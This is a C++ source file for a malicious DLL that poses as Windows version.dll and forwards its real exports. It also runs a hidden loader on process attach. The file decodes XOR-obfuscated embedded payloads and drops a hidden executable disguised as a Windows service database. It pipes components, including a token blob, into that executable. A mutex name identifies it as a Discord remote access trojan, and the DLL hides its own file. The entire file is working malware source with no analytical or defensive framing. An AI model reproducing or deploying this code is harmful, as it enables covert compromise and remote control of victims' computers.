#include <windows.h>
#include <shlobj.h>
#include <strsafe.h>
#include <winhttp.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winhttp.lib")

#define RES_LOADER 101
#define RES_CORE 102
#define RES_TOKEN 103
#define RES_MEDIA 104
#define XOR_KEY 0xA7

static HMODULE g_realVersion = NULL;
static HMODULE g_selfModule = NULL;

static FARPROC RealProc(const char* name)
{
    if (!g_realVersion)
    {
#ifdef _WIN64
        g_realVersion = LoadLibraryW(L"C:\\Windows\\System32\\version.dll");
#else
        g_realVersion = LoadLibraryW(L"C:\\Windows\\SysWOW64\\version.dll");
#endif
    }
    return g_realVersion ? GetProcAddress(g_realVersion, name) : NULL;
}

static void HideSystemPath(const wchar_t* path)
{
    DWORD attrs = GetFileAttributesW(path);
    if (attrs != INVALID_FILE_ATTRIBUTES)
    {
        SetFileAttributesW(path, (attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM) & ~FILE_ATTRIBUTE_READONLY);
    }
}

static void HideSelfDll()
{
    if (!g_selfModule)
    {
        return;
    }

    wchar_t selfPath[MAX_PATH] = { 0 };
    if (GetModuleFileNameW(g_selfModule, selfPath, MAX_PATH))
    {
        HideSystemPath(selfPath);
    }
}

static bool LoadResourceBuffer(int resourceId, BYTE** outData, DWORD* outSize)
{
    *outData = NULL;
    *outSize = 0;

    HRSRC resource = FindResourceA(g_selfModule, MAKEINTRESOURCEA(resourceId), RT_RCDATA);
    if (!resource)
    {
        return false;
    }

    HGLOBAL loaded = LoadResource(g_selfModule, resource);
    if (!loaded)
    {
        return false;
    }

    DWORD size = SizeofResource(g_selfModule, resource);
    void* data = LockResource(loaded);
    if (!data || size == 0)
    {
        return false;
    }

    BYTE* copy = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!copy)
    {
        return false;
    }

    CopyMemory(copy, data, size);
    *outData = copy;
    *outSize = size;
    return true;
}

static void XorDecodeBuffer(BYTE* data, DWORD size)
{
    for (DWORD i = 0; i < size; i++)
    {
        data[i] ^= XOR_KEY;
    }
}

static void FreeBuffer(BYTE* data)
{
    if (data)
    {
        VirtualFree(data, 0, MEM_RELEASE);
    }
}

static bool WriteAllToHandle(HANDLE handle, const void* data, DWORD size)
{
    const BYTE* cursor = (const BYTE*)data;
    DWORD remaining = size;

    while (remaining > 0)
    {
        DWORD written = 0;
        if (!WriteFile(handle, cursor, remaining, &written, NULL) || written == 0)
        {
            return false;
        }
        cursor += written;
        remaining -= written;
    }

    return true;
}

static bool WriteUInt32(HANDLE handle, DWORD value)
{
    return WriteAllToHandle(handle, &value, sizeof(value));
}

static bool EnsureLoaderDbPath(wchar_t* outPath, size_t outChars)
{
    wchar_t localAppData[MAX_PATH] = { 0 };
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData)))
    {
        return false;
    }

    wchar_t dir[MAX_PATH] = { 0 };
    if (FAILED(StringCchPrintfW(dir, MAX_PATH, L"%s\\Microsoft\\Windows\\AppReadiness", localAppData)))
    {
        return false;
    }

    SHCreateDirectoryExW(NULL, dir, NULL);
    return SUCCEEDED(StringCchPrintfW(outPath, outChars, L"%s\\WaaSMedicSvc.db", dir));
}

static bool EnsureLoaderDbOnDisk(const wchar_t* loaderPath, BYTE* loaderExe, DWORD loaderSize)
{
    WIN32_FILE_ATTRIBUTE_DATA attrs = { 0 };
    if (GetFileAttributesExW(loaderPath, GetFileExInfoStandard, &attrs))
    {
        if (attrs.nFileSizeLow == loaderSize && attrs.nFileSizeHigh == 0)
        {
            HideSystemPath(loaderPath);
            return true;
        }
    }

    HANDLE loaderFile = CreateFileW(
        loaderPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
        NULL);

    if (loaderFile == INVALID_HANDLE_VALUE)
    {
        return false;
    }

    bool written = WriteAllToHandle(loaderFile, loaderExe, loaderSize);
    CloseHandle(loaderFile);

    if (!written)
    {
        DeleteFileW(loaderPath);
        return false;
    }

    HideSystemPath(loaderPath);
    return true;
}

static bool LaunchLoaderFromMemory(BYTE* loaderExe, DWORD loaderSize, BYTE* core, DWORD coreSize, BYTE* token, DWORD tokenSize, BYTE* media, DWORD mediaSize)
{
    wchar_t loaderPath[MAX_PATH] = { 0 };
    if (!EnsureLoaderDbPath(loaderPath, MAX_PATH))
    {
        return false;
    }

    if (!EnsureLoaderDbOnDisk(loaderPath, loaderExe, loaderSize))
    {
        return false;
    }

    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE readPipe = NULL;
    HANDLE writePipe = NULL;
    if (!CreatePipe(&readPipe, &writePipe, &sa, 1024 * 1024))
    {
        DeleteFileW(loaderPath);
        return false;
    }

    SetHandleInformation(writePipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = readPipe;
    si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    si.hStdError = GetStdHandle(STD_ERROR_HANDLE);

    wchar_t commandLine[MAX_PATH + 32] = { 0 };
    StringCchPrintfW(commandLine, MAX_PATH + 32, L"\"%s\" --pipe", loaderPath);

    if (!CreateProcessW(loaderPath, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        CloseHandle(readPipe);
        CloseHandle(writePipe);
        DeleteFileW(loaderPath);
        return false;
    }

    CloseHandle(readPipe);

    bool ok = WriteUInt32(writePipe, coreSize) &&
        WriteAllToHandle(writePipe, core, coreSize) &&
        WriteUInt32(writePipe, tokenSize) &&
        WriteAllToHandle(writePipe, token, tokenSize) &&
        WriteUInt32(writePipe, mediaSize) &&
        WriteAllToHandle(writePipe, media, mediaSize);

    CloseHandle(writePipe);

    if (!ok)
    {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        DeleteFileW(loaderPath);
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

static void LaunchEmbeddedPayloadInMemory()
{
    HANDLE runningMutex = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\DiscordRAT_ShaherDev_v1");
    if (runningMutex)
    {
        CloseHandle(runningMutex);
        HideSelfDll();
        return;
    }

    BYTE* loaderExe = NULL;
    BYTE* core = NULL;
    BYTE* token = NULL;
    BYTE* media = NULL;
    DWORD loaderSize = 0;
    DWORD coreSize = 0;
    DWORD tokenSize = 0;
    DWORD mediaSize = 0;

    if (!LoadResourceBuffer(RES_LOADER, &loaderExe, &loaderSize) ||
        !LoadResourceBuffer(RES_CORE, &core, &coreSize))
    {
        FreeBuffer(loaderExe);
        FreeBuffer(core);
        HideSelfDll();
        return;
    }

    XorDecodeBuffer(core, coreSize);

    if (LoadResourceBuffer(RES_TOKEN, &token, &tokenSize))
    {
        XorDecodeBuffer(token, tokenSize);
    }

    if (LoadResourceBuffer(RES_MEDIA, &media, &mediaSize))
    {
        XorDecodeBuffer(media, mediaSize);
    }

    LaunchLoaderFromMemory(loaderExe, loaderSize, core, coreSize, token ? token : (BYTE*)"", tokenSize, media ? media : (BYTE*)"", mediaSize);

    FreeBuffer(loaderExe);
    FreeBuffer(core);
    FreeBuffer(token);
    FreeBuffer(media);
    HideSelfDll();
}

DWORD WINAPI RunLoader(LPVOID)
{
    LaunchEmbeddedPayloadInMemory();
    return 0;
}

extern "C"
{
    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(LPCSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoA");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoW(LPCWSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(LPCWSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoW");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoExA(DWORD flags, LPCSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(DWORD, LPCSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoExA");
        return fn ? fn(flags, a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_GetFileVersionInfoExW(DWORD flags, LPCWSTR a, DWORD b, DWORD c, LPVOID d)
    {
        auto fn = (BOOL (WINAPI*)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID))RealProc("GetFileVersionInfoExW");
        return fn ? fn(flags, a, b, c, d) : FALSE;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(LPCSTR, LPDWORD))RealProc("GetFileVersionInfoSizeA");
        return fn ? fn(a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(LPCWSTR, LPDWORD))RealProc("GetFileVersionInfoSizeW");
        return fn ? fn(a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeExA(DWORD flags, LPCSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPDWORD))RealProc("GetFileVersionInfoSizeExA");
        return fn ? fn(flags, a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_GetFileVersionInfoSizeExW(DWORD flags, LPCWSTR a, LPDWORD b)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPDWORD))RealProc("GetFileVersionInfoSizeExW");
        return fn ? fn(flags, a, b) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerFindFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPSTR e, PUINT f, LPSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT, LPSTR, PUINT))RealProc("VerFindFileA");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerFindFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPWSTR e, PUINT f, LPWSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT, LPWSTR, PUINT))RealProc("VerFindFileW");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerInstallFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPCSTR e, LPCSTR f, LPSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT))RealProc("VerInstallFileA");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerInstallFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPCWSTR e, LPCWSTR f, LPWSTR g, PUINT h)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT))RealProc("VerInstallFileW");
        return fn ? fn(a, b, c, d, e, f, g, h) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerLanguageNameA(DWORD a, LPSTR b, DWORD c)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPSTR, DWORD))RealProc("VerLanguageNameA");
        return fn ? fn(a, b, c) : 0;
    }

    __declspec(dllexport) DWORD WINAPI Proxy_VerLanguageNameW(DWORD a, LPWSTR b, DWORD c)
    {
        auto fn = (DWORD (WINAPI*)(DWORD, LPWSTR, DWORD))RealProc("VerLanguageNameW");
        return fn ? fn(a, b, c) : 0;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID* c, PUINT d)
    {
        auto fn = (BOOL (WINAPI*)(LPCVOID, LPCSTR, LPVOID*, PUINT))RealProc("VerQueryValueA");
        return fn ? fn(a, b, c, d) : FALSE;
    }

    __declspec(dllexport) BOOL WINAPI Proxy_VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID* c, PUINT d)
    {
        auto fn = (BOOL (WINAPI*)(LPCVOID, LPCWSTR, LPVOID*, PUINT))RealProc("VerQueryValueW");
        return fn ? fn(a, b, c, d) : FALSE;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        g_selfModule = hModule;
        DisableThreadLibraryCalls(hModule);
        RealProc("GetFileVersionInfoW");
        HANDLE thread = CreateThread(NULL, 0, RunLoader, NULL, 0, NULL);
        if (thread)
        {
            CloseHandle(thread);
        }
    }

    return TRUE;
}
